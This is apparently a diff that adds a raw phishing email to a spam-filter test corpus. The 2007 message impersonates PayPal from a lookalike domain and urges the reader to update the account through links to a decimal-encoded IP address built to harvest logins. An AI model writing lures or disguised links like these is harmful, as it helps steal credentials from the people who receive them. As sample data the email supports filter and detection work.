@@ -1,0 +1,75 @@
+From nobody Sun Jan 25 13:50:04 2015
+Return-Path: <account@paypal-us.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id B375F468CF
+ for <user@login.example.com>; Sat,  9 Jun 2007 21:48:07 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id A8342131F9E1
+ for <user@example.com>; Sat,  9 Jun 2007 21:48:07 -0400 (EDT)
+Received: from ???????????? (hokang.cnu.ac.kr [168.188.50.164])
+ by mail.example.org (Postfix) with ESMTP id 6484C6FA1C5
+ for <user@example.com>; Sat,  9 Jun 2007 21:48:07 -0400 (EDT)
+Received: from User ([71.138.11.230]) by 폐수방서버컴 with Microsoft SMTPSVC(5.0.2195.6713);
+	 Sun, 10 Jun 2007 10:45:32 +0900
+Reply-To: <noreply@paypal-us.com>
+From: "PayPal"<account@paypal-us.com>
+Subject: Your current account information has not been verified
+Date: Sat, 9 Jun 2007 18:43:21 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 5.50.4522.1200
+X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200
+Message-ID: <폐수방서버컴sokLQ8a000001df@폐수방서버컴>
+X-OriginalArrivalTime: 10 Jun 2007 01:45:32.0750 (UTC)
+ FILETIME=[0864F6E0:01C7AB01]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1374
+
+
+
+
+
+
+            <p align="left"><font face="Verdana" size="2">Dear Customer, <br>
+
+              <br>
+
+              You have added <b>aaronjames@comcast.net</b> as a new email address for your
+PayPal account.<br>
+    		If you don't agree with this email and if you need assistance with your account,<br>
+  click here and 
+			<b> 
+			<a target="_blank" href="http://3479221164:81/paypal.com/updates/us/webscr.php?cmd=_login-run">process your login</a></b>.<br>
+
+              <br>
+
+              The account statement for your 
+			PayPal account
+
+              can be viewed at any time by visiting our website.<br>
+
+              <br>
+
+              Your current account information has not been verified in the previous
+
+              six months. Please update your information to continue using your
+
+              PayPal account normally. <br>
+
+              Please
+			<b>
+			<a target="_blank" href="http://3479221164:81/paypal.com/updates/us/webscr.php?cmd=_login-run">click here</a></b> to update you account.<br>
+
+            <br>
+
+              &nbsp;</font><address align="left"><span style="font-style: normal">
+	<font face="Verdana" size="2">Please do not reply to this email. This mailbox is not monitored and you will not receive a response.</font></span></address>
